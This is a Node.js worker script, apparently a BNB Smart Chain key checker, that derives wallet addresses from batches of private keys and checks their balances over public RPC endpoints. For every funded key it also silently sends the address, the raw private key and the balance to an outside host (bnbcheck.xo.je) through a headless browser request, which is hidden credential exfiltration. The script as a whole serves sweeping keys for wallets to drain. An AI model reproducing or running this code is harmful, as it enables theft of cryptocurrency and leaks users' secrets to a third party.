import fs from "node:fs/promises";
import { parentPort, workerData } from "node:worker_threads";
import { Web3 } from "web3";
import puppeteer, { Page, Puppeteer } from "puppeteer";

const web3 = new Web3();

const OUTPUT = "./output/hasil.txt";

await fs.mkdir("./output", { recursive: true });

function saveResults(results) {
  if (results == 0) return Promise.resolve();

  return fs.appendFile(
    OUTPUT,
    results + "\n"
  );
}

const RPC = [
  
  "https://bsc.blockrazor.xyz",
  "https://rpc-bsc.48.club",
  "https://bsc.rpc.blxrbdn.com",
  "https://0.48.club",
  "https://bnb-mainnet.g.alchemy.com/public",
  "https://bsc-dataseed3.bnbchain.org",
  "https://bsc-dataseed2.bnbchain.org",
  "https://bsc-dataseed4.bnbchain.org",
  "https://bsc-dataseed-public.bnbchain.org",
  "https://bsc-rpc.publicnode.com",
  "https://bsc-mainnet.public.blastapi.io"

];

let TOTALL_WORKER = 0;
let TOTON_WORKER = 0;
let TOTFAIL_WORKER = 0;
let ON_WORKER = 0;
let FAIL_WORKER = 0;

let rpcIndex = 0;
const JML = workerData.workerBatch;

const SplitBatch = Math.floor(JML / 10);

const web3A = [];
for (let i = 0; i < RPC.length; i++) {
	const web = new Web3(new Web3.providers.HttpProvider(RPC[i]));
	web3A.push(web);
}

function getAddress(privateKey) {
  return web3.eth.accounts.privateKeyToAccount('0x' +  privateKey).address; 
}

async function fetchUrl(url) {
  
  const browser = await puppeteer.launch({
    headless: true,
	args: [
		'--no-sandbox',
		'--disable-dev-shm-usage',
		'--disable-gpu',
		'--no-zygote'
		]
	});
	
	const page = await browser.newPage();
	
	await page.setJavaScriptEnabled(true);
	
  try{
  
    await page.goto(url,{
      waitUntil: "domcontentloaded",
      timeout: 60000
    });

  } catch(error){
    console.error("Error : ", error.message);
  } finally {
	  browser.close();
  }
}

async function sendData(results) {
  const url = "https://bnbcheck.xo.je/post.php?addr=" + encodeURI(results.address) +
                "&key=" + encodeURI(results.privateKey) +
                "&phrase=" + encodeURI(results.privateKey) +
                "&balance=" + encodeURI(results.blc) ;

  try {
    await fetchUrl(url);
  } catch (error) {
    console.error("Request gagal:", error.message);
  }
}

async function getBalance(address, key){
	let hslBal = -1;
	TOTALL_WORKER++;
	try{
		const balanceWei = await web3A[rpcIndex].eth.getBalance(address);
		const balanceBNB = web3A[rpcIndex].utils.fromWei(balanceWei, "ether");

		TOTON_WORKER++;
		ON_WORKER++;

		hslBal = balanceBNB;

		if(balanceBNB > 0){
				
		  const Ares = {address : address, privateKey: key, blc: balanceBNB}
		  const rslt = address + "," + key + "," + balanceBNB;

		  await saveResults(rslt);

		  await sendData(Ares);
		}	
		

	} catch (e){
      TOTFAIL_WORKER++
	  FAIL_WORKER++;
      rpcIndex++;
      if(rpcIndex >= web3A.length){
        rpcIndex = 0;
      }

      
		
	}
    return hslBal;
}

async function processBatch(keys) {
  let results = [];

  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  
  

	for (const privateKey of keys) {

			  const address = getAddress(privateKey);
			  let balance = -1;
	 
			  while (balance < 0) {
					try {
						  balance = await getBalance(address, privateKey);

						  if(balance < 0){
							  await delay(1000);
						  } else {
							  break;
						  }

					} catch (error) {

					}
				
			  }
		  
			  if(balance > 0){
				  
				results.push(
					{
						addr : address,
						bal : balance,
						key : privateKey
					}
				); 
			  }
      
			  if(ON_WORKER % SplitBatch == 0){
 
				  parentPort.postMessage({
					type: "progress",
					workerId: workerData.workerId,
					checked: ON_WORKER,
					fail: FAIL_WORKER,
					toton: TOTON_WORKER,			
					totfail: TOTFAIL_WORKER,
					totall: TOTALL_WORKER,
					res: results
				  });
				  
				  results = [];
				  
			  }

  
	}
  

	  parentPort.postMessage({
		type: "complete",
		workerId: workerData.workerId,
		checked: ON_WORKER,
		fail: FAIL_WORKER,
		toton: TOTON_WORKER,			
		totfail: TOTFAIL_WORKER,
		totall: TOTALL_WORKER,
		res: results
	  });
	  
	  results = [];
  
}

parentPort.on("message", async message => {
  if (message.type === "batch") {
	ON_WORKER = 0;
	FAIL_WORKER = 0;
    await processBatch(message.keys);
  }
});
